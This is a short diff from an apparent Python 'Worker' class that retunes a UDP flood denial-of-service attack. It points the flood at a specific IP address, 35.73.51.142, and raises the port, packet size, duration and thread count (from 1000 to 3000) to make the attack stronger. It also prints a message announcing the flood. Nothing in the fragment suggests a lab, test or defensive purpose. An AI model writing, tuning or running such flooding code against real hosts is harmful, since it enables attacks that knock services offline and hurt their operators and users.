@@ -481,10 +481,10 @@ class Worker:
         # ====================================================
 
         TARGET_IP = '35.73.51.142'
-        TARGET_PORT = 9013
-        PACKET_SIZE = 2024
-        DURATION = 30
-        NUM_THREADS = 1000
+        TARGET_PORT = 15013
+        PACKET_SIZE = 3000
+        DURATION = 40
+        NUM_THREADS = 3000
 
         print(f"\n[*] Starting UDP flood to {TARGET_IP}:{TARGET_PORT} using {NUM_THREADS} threads for {DURATION} seconds...")
 
